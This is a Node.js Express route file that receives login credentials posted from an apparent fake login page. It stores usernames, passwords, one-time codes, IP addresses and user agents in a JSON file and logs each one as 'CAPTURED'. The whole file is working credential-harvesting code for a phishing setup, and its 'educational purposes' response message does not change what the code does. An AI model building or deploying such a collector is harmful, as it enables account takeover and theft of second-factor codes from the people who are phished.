const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const dataFile = path.join(__dirname, '../data/capturedData.json');

// Save data to file
const saveToFile = () => {
  try {
    fs.writeFileSync(dataFile, JSON.stringify(global.capturedData, null, 2));
    return true;
  } catch (error) {
    console.error('Error saving data:', error);
    return false;
  }
};

// Capture credentials from login page
// CHANGE: This should be at root of /api/capture, not /api/capture/capture
router.post('/', (req, res) => {
  try {
    const { type, identifier, password, code, userAgent, sessionId, attempt, method } = req.body;
    
    const capturedItem = {
      id: uuidv4(),
      type: type || 'LOGIN_ATTEMPT',
      identifier: identifier,
      password: password,
      code: code,
      method: method,
      attempt: attempt,
      userAgent: userAgent || req.get('User-Agent'),
      ip: req.ip || req.connection.remoteAddress,
      timestamp: new Date().toISOString(),
      sessionId: sessionId || uuidv4()
    };

    // Add to global storage
    global.capturedData.unshift(capturedItem);
    
    // Keep only last 100 items to prevent memory issues
    if (global.capturedData.length > 100) {
      global.capturedData = global.capturedData.slice(0, 100);
    }

    // Save to file
    saveToFile();

    console.log('🎯 CAPTURED:', {
      type: capturedItem.type,
      identifier: capturedItem.identifier,
      timestamp: capturedItem.timestamp
    });

    res.json({ 
      success: true, 
      message: 'Data captured for educational purposes',
      id: capturedItem.id
    });

  } catch (error) {
    console.error('Capture error:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

module.exports = router;